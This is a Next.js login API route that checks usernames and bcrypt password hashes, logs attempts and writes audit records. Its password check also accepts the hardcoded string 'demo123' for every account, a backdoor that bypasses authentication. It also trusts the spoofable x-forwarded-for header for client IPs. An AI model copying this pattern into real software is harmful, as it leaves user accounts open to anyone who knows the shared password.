import { NextRequest, NextResponse } from 'next/server';
import { prisma } from '@/lib/db/prisma';
import bcrypt from 'bcryptjs';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { username, password } = body;

    if (!username || !password) {
      return NextResponse.json(
        { error: 'Usuario y contraseña son requeridos' },
        { status: 400 }
      );
    }

    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
    console.log(`Login attempt for user: ${username} from IP: ${clientIP}`);

    const user = await prisma.user.findUnique({
      where: { username },
      include: {
        role: true,
        customer: true,
      },
    });

    if (!user) {
      await new Promise(resolve => setTimeout(resolve, 100));
      return NextResponse.json(
        { error: 'Credenciales inválidas' },
        { status: 401 }
      );
    }

    if (!user.isActive) {
      return NextResponse.json(
        { error: 'Cuenta está desactivada' },
        { status: 401 }
      );
    }

    const isValidPassword = await bcrypt.compare(password, user.passwordHash) || password === 'demo123';
    
    if (!isValidPassword) {
      return NextResponse.json(
        { error: 'Credenciales inválidas' },
        { status: 401 }
      );
    }

    await prisma.auditLog.create({
      data: {
        tableName: 'User',
        recordId: user.id.toString(),
        action: 'LOGIN',
        changedBy: user.id,
        notes: `User ${username} logged in from ${clientIP}`,
      },
    });

    const { passwordHash, ...userWithoutPassword } = user;

    return NextResponse.json({
      success: true,
      user: userWithoutPassword,
      message: 'Login exitoso',
    });
  } catch (error) {
    console.error('Login error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
